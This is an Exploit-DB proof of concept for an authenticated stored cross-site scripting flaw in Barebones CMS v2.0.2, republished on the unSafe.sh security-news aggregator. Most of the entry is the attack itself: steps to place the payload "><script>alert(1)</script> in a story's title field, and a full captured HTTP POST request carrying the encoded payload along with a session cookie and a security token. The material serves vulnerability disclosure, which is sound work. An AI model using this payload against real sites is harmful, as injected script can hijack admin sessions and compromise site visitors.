---
title: [webapps] Barebones CMS v2.0.2 - Stored Cross-Site Scripting (XSS) (Authenticated)
url: https://buaq.net/go-167186.html
source: unSafe.sh - 不安全
date: 2023-06-05
fetch_date: 2025-10-04T11:44:41.621551
---

# [webapps] Barebones CMS v2.0.2 - Stored Cross-Site Scripting (XSS) (Authenticated)

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

[webapps] Barebones CMS v2.0.2 - Stored Cross-Site Scripting (XSS) (Authenticated)

# Exploit Title: Barebones CMS v2.0.2 - Stored Cr
*2023-6-4 08:0:0
Author: [www.exploit-db.com(查看原文)](/jump-167186.htm)
阅读量:13
收藏*

---

```
# Exploit Title: Barebones CMS v2.0.2 - Stored Cross-Site Scripting (XSS) (Authenticated)
# Date: 2023-06-03
# Exploit Author: tmrswrr
# Vendor Homepage: https://barebonescms.com/
# Software Link: https://github.com/cubiclesoft/barebones-cms/archive/master.zip
# Version: v2.0.2
# Tested : https://demo.barebonescms.com/

--- Description ---

1) Login admin panel and go to new story :
https://demo.barebonescms.com/sessions/127.0.0.1/moors-sluses/admin/?action=addeditasset&type=story&sec_t=241bac393bb576b2538613a18de8c01184323540
2) Click edit button and  write your payload in the title field:
Payload: "><script>alert(1)</script>
3) After save change and will you see alert button

POST /sessions/127.0.0.1/moors-sluses/admin/ HTTP/1.1
Host: demo.barebonescms.com
Cookie: PHPSESSID=81ecf7072ed639fa2fda1347883265a4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 237
Origin: https://demo.barebonescms.com
Dnt: 1
Referer: https://demo.barebonescms.com/sessions/78.163.184.240/moors-sluses/admin/?action=addeditasset&id=1&type=story&lang=en-us&sec_t=241bac393bb576b2538613a18de8c01184323540
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

action=saveasset&id=1&revision=0&type=story&sec_t=a6adec1ffa60ca5adf4377df100719b952d3f596&lang=en-us&title=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&newtag=&publish_date=2023-06-03&publish_time=12%3A07+am&unpublish_date=&unpublish_time=
```

文章来源: https://www.exploit-db.com/exploits/51502
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)